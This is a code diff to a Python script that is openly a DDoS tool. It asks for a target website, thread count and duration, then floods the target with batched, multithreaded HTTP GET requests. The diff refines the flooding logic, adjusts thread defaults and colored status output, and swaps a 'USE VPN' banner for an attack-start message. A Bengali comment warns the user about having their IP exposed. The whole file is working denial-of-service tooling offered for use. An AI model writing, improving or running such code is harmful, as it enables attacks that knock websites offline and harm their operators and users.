@@ -1,45 +1,47 @@
 import requests
 import threading
 import time
-from colorama import init, Fore, Style
 import subprocess
-
+from colorama import init, Fore
 
 # ভালো কাজে ব্যাবহার কইরেন!!! আইপি এক্সপস হইলে আপনি শেষ⚠
-# Define the list of packages to install
-packages = ["requests", "threading", "colorama"]
+# Install required packages
+packages = ["requests", "colorama"]
+subprocess.run(["pip", "install", *packages])
 
-# Install the packages using pip
-for pkg in packages:
-    subprocess.run(["pip", "install", pkg])
-
-# Initialize colorama to support ANSI escape sequences on Windows
+# Initialize colorama for colored output
 init()
 
 def establish_connection(url):
     try:
-        response = requests.get(url)
-        print("Connection established with", url)
-        return True
+        response = requests.get(url, timeout=5)
+        if response.status_code == 200:
+            print(Fore.GREEN + "Connection established with", url)
+            return True
+        else:
+            print(Fore.RED + "Failed to establish connection with", url, "- HTTP Status Code:", response.status_code)
+            return False
     except Exception as e:
-        print("Error establishing connection:", e)
+        print(Fore.RED + "Error establishing connection:", e)
         return False
 
 def send_request(session, url):
     try:
         response = session.get(url)
-        # Add your DDoS attack logic here
-        print("DDoS attack request sent")
+        if response.status_code == 200:
+            print(Fore.YELLOW + "DDoS attack request sent to", url)
+        else:
+            print(Fore.RED + "Failed to send DDoS attack request to", url, "- HTTP Status Code:", response.status_code)
     except requests.exceptions.RequestException as e:
-        print("Error occurred during DDoS attack:", e)
+        print(Fore.RED + "Error occurred during DDoS attack:", e)
 
-def start_ddos(url, num_threads=9999, duration=60):
+def start_ddos(url, num_threads=100, duration=60):
     try:
         if not establish_connection(url):
-            print("Exiting program.")
+            print(Fore.RED + "Exiting program.")
             return
 
-        print("Setting up threads...")
+        print(Fore.CYAN + "Setting up threads...")
         time.sleep(5)  # Wait for 5 seconds before setting up threads
 
         with requests.Session() as session:
@@ -47,21 +49,28 @@ def start_ddos(url, num_threads=9999, duration=60):
             for _ in range(num_threads):
                 thread = threading.Thread(target=send_request, args=(session, url))
                 threads.append(thread)
-                
-                # Start 5 threads at once
+
                 if len(threads) == 5:
                     for thread in threads:
                         thread.start()
                     for thread in threads:
                         thread.join()
                     threads = []
-                    time.sleep(1)  # Wait for 1 second before starting the next batch
+                    time.sleep(0.75)  # Wait for 0.5 seconds before starting the next batch
 
-            print("DDoS attack completed.")
+            # Start any remaining threads
+            for thread in threads:
+                thread.start()
+
+            # Wait for all threads to finish or timeout
+            for thread in threads:
+                thread.join(timeout=duration)
+
+            print(Fore.GREEN + "DDoS attack completed.")
     except KeyboardInterrupt:
-        print("\nDDoS attack interrupted.")
+        print(Fore.YELLOW + "\nDDoS attack interrupted.")
     except Exception as e:
-        print("Error occurred:", e)
+        print(Fore.RED + "Error occurred:", e)
 
 def main():
     # Display ASCII art
@@ -82,13 +91,13 @@ def main():
     """
     print(Fore.WHITE + ascii_art)
 
-    # User input section
+
+ # User input section
     target_website = input("Enter the target website link: ")
-    target_ip = input("Enter the target IP address: ")
-    total_threads = int(input("Enter the total threads (default is 9999): ") or "9999")
+    total_threads = int(input("Enter the total threads (default is 100): ") or "100")
     attack_time = int(input("Enter the attack time in seconds (default is 60): ") or "60")
 
-    print("\033[1;91m\033[5mUSE VPN - USE VPN - USE VPN\033[0m")
+    print("\033[1;91m\033[5mStarting DDoS attack...\033[0m")
 
     # Start DDoS attack
     start_ddos(target_website, total_threads, attack_time)
